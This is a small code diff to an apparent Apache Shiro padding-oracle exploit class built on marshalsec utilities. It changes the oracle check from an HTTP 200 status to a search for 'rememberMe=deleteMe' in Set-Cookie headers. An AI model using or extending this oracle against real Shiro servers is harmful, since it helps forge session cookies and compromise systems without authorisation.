@@ -7,6 +7,7 @@ import java.util.Base64;
 import javax.net.ssl.SSLContext;
 import marshalsec.util.PaddingOracleCBCForShiro;
 import marshalsec.util.PaddingOracleCBCForShiro.CBCResult;
+import org.apache.http.Header;
 import org.apache.http.client.methods.CloseableHttpResponse;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
@@ -100,11 +101,11 @@ public class ShiroPaddingOracleCBC extends Shiro {
       try {
         httpClient = httpClientBuilder.build();
         response = httpClient.execute(httpGet);
-        int status = response.getStatusLine().getStatusCode();
-        if (status == 200) {
-          return true;
-        } else {
-          return false;
+        Header[] headers = response.getHeaders("Set-Cookie");
+        for (int i = 0; i < headers.length; i++) {
+          if (headers[i].getValue().contains("rememberMe=deleteMe")) {
+            return true;
+          }
         }
       } finally {
         response.close();
